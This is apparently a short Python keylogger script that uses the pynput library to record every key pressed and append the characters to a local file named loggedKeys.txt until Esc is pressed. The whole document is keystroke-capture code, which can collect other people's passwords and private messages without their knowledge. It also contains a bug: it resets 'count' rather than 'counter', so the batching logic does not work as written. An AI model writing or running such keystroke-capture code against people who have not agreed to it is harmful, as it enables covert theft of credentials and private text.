import sys
import pynput

from pynput.keyboard import Key, Listener

keysPressed = []
counter = 0

def on_press(key):
    global keysPressed, counter

    keysPressed.append(key)
    counter += 1

    if counter > 5:
        create_file(keysPressed)
        count = 0
        keysPressed = []

def on_release(key):
    if key == Key.esc:
        return False

def create_file(keysPressed):
    with open("loggedKeys.txt", "a") as file:
        for key in keysPressed:
            stringKey = str(key).replace("'","")

            if stringKey.find("space") > 0:
                file.write("\n")
            elif stringKey.find("enter") > 0:
                file.write("\n")
            if stringKey.find("Key") == -1:
                file.write(stringKey)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
